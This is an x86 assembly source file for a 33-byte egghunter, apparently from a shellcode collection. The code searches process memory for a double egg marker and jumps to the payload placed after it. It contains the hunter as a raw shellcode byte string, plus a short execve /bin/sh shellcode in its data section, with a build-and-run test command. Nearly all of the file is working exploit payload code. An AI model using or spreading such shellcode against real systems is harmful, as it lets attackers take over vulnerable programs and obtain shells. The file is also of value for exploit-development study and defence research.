# /*		x86 egghunter - Length: 33 bytes	*/ #
# /*   based on Skape's "Safely Searching Process VAS"	*/ #

.set EGG, 0xc0ffee42

# char shellcode[] =
#   "\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8"\
#   "\x42\xee\xff\xc0"\
#   "\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";


.set EFAULT, 0xf2

.set MINIMAL, 1

.text
.globl _start
_start:
.if MINIMAL == 1
.else
	cld			# clear the direction flag
	xorl %edx, %edx		# init %edx to $0
.endif
align:
	orw $0xfff, %dx		# PAGE_SIZE - 1
try_next:
	inc %edx		# %edx aligned to new page
	leal 0x4(%edx), %ebx	# address tested
	pushl $33		# sys_access
	pop %eax
	int $0x80		# syscall

	# /* if %ebx isn't a valid address, the syscall returns EFAULT */ #
	cmpb $EFAULT, %al
	jz align		# We then test next page

	movl $EGG, %eax
	movl %edx, %edi
	scasl			# cmpl (%edi), %eax; leal 0x4(%edi), %edi
	jnz try_next
	scasl			# idem
	jnz try_next
	jmp *%edi

# /* The following places the double-egg in memory
#	followed by x86-binsh_short's shellcode
# (test it with 'make c p assembly S=examples/x86-egghunter.s && ./assembly') */
.data
	.int EGG, EGG
	.ascii "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80"
